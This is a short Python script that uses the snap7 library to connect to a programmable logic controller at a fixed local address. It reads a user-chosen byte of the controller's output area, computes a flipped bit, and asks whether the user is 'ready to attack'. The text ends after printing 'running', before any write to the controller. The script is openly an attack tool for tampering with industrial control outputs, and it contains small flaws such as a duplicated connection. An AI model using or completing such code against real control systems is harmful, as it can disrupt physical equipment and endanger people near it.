import sys
import snap7
from snap7.util import *
from snap7.types import *
from contextlib import suppress

plc = snap7.client.Client()
plc.connect("192.168.0.1", 0, 1)

def inputFail(input, byteOrBit: int) -> int:
    try:
        valByte = int(input)
        if(byteOrBit == 0):
            if(valByte < 0 or valByte >65525):
                raise ValueError
        if(byteOrBit == 1):
            if(valByte < 0 or valByte>7):
                raise ValueError
    except ValueError:
        if(byteOrBit == 0):
            print("Please enter a byte from 0-65,525.")
        if(byteOrBit == 1):
            print("Please enter a bit from 0-7")
        sys.exit()
    return(valByte)

def getAndFlipBit(byte, bitPosition):
    mask = 1 << bitPosition
    return((mask & byte) >> bitPosition, mask ^ byte)

startByte = inputFail(input("Which Byte do you want to interfere with? \n"), 0)
whatBit = inputFail(input("Which Bit do you want to interfere with? \n"), 1)

plc = snap7.client.Client()
plc.connect("192.168.0.1", 0, 1)


# PE = 0x81 -> Inputs
# PA = 0x82 -> Outputs
# MK = 0x83 -> Memorys
# DB = 0x84 -> Database
# CT = 0x1C -> Counter
# TM = 0x1D -> Timer
    
area = snap7.types.Areas.PA
numberOfUnits = 1
wordLength = WordLen.Byte

readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
restingBit, toWriteByte = getAndFlipBit(readBytes[0], whatBit)

print(f"Overall Byte value is: {readBytes[0]} \n")
print(f"The resting value for your specified byte: {startByte} and specified bit: {whatBit} is bit value: {restingBit}")


ready = input("Have you noted this down and are ready to attack? press y if ready")
if(str(ready) != "y"):
    sys.exit()

print("running")
